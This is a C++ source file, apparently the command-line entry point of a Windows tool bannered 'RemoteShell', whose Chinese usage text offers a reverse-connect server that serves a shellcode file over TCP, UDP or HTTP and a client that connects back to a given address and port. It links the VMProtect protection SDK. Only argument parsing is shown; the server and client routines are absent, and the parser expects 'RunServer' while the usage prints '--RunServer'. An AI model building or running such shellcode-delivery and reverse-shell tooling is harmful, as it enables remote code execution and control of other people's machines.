#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <WinSock2.h>
#include <Windows.h>
#include <string>
#include <WinInet.h>
#include <VMProtectSDK.h>

#pragma comment(lib,"VMProtectSDK32.lib")
#pragma comment(lib, "WinInet.lib")
#pragma comment(lib,"ws2_32")

int main(int argc, char* argv[])
{
	if (argc <= 2)
	{
		fprintf(stderr, 
			" ____                      _       ____  _          _ _  \n"
			"|  _ \ ___ _ __ ___   ___ | |_ ___/ ___|| |__   ___| | | \n"
			"| |_) / _ \ '_ ` _ \ / _ \| __/ _ \___ \| '_ \ / _ \ | | \n"
			"|  _ <  __/ | | | | | (_) | ||  __/___) | | | |  __/ | | \n"
			"|_| \_\___|_| |_| |_|\___/ \__\___|____/|_| |_|\___|_|_| \n"
			"                                                         \n"
			"Email: me@lyshark.com \n"
			"Usage: \n\n"
			"远程传输 \n"
			" \t --RunServer                   运行反弹服务器 \n"
			" \t --type [tcp/udp/http]         指定反弹服务器类型 \n"
			" \t --listen                      指定服务器开放端口 \n"
			" \t --shellcode                   指定ShellCode反弹文件 \n\n"

			" \t --RunClient                   执行客户端等待 \n"
			" \t --type [tcp/udp/http]         设置传输协议 \n"
			" \t --address                     指定服务器地址 \n"
			" \t --port                        指定服务器端口 \n\n"
			);

		return -1;
	}

	if (argc == 8)
	{
		// RunServer --type tcp/udp/http --listen 8888 --shellcode d://test.shell
		if (strcmp((char*)argv[1], "RunServer") == 0
			&& strcmp((char*)argv[2], "--type") == 0
			&& strcmp((char*)argv[4], "--listen") == 0
			&& strcmp((char*)argv[6], "--shellcode") == 0
			)
		{
			// 判断是TCP还是UDP
			if (strcmp((char*)argv[3], "tcp") == 0)
			{
				Server::RunTCPServer(atoi(argv[5]), argv[7]);
			}
			else if (strcmp((char*)argv[3], "udp") == 0)
			{
				Server::RunUDPServer(atoi(argv[5]), argv[7]);
			}
		}
	}

	if (argc == 6)
	{
		// RunServer --type http --listen 8888
		if (strcmp((char*)argv[1], "RunServer") == 0
			&& strcmp((char*)argv[2], "--type") == 0
			&& strcmp((char*)argv[4], "--listen") == 0
			)
		{
			// 判断HTTP协议
			if (strcmp((char*)argv[3], "http") == 0)
			{
				Server::RunHTTPServer(atoi(argv[5]));
			}
		}
	}

	if (argc == 8)
	{
		// RunClient --type tcp/udp/http --address 127.0.0.1 --port 8888
		if (strcmp((char*)argv[1], "RunClient") == 0
			&& strcmp((char*)argv[2], "--type") == 0
			&& strcmp((char*)argv[4], "--address") == 0
			&& strcmp((char*)argv[6], "--port") == 0
			)
		{
			// 判断是TCP还是UDP
			if (strcmp((char*)argv[3], "tcp") == 0)
			{
				Client::RunTCPClient(argv[5], atoi(argv[7]));
			}
			else if (strcmp((char*)argv[3], "udp") == 0)
			{
				Client::RunUDPClient(argv[5], atoi(argv[7]));
			}

			// 判断是否是http
			if (strcmp((char*)argv[3], "http") == 0)
			{
				Client::RunHTTPClient(argv[5], atoi(argv[7]));
			}
		}
	}
	return 0;
}
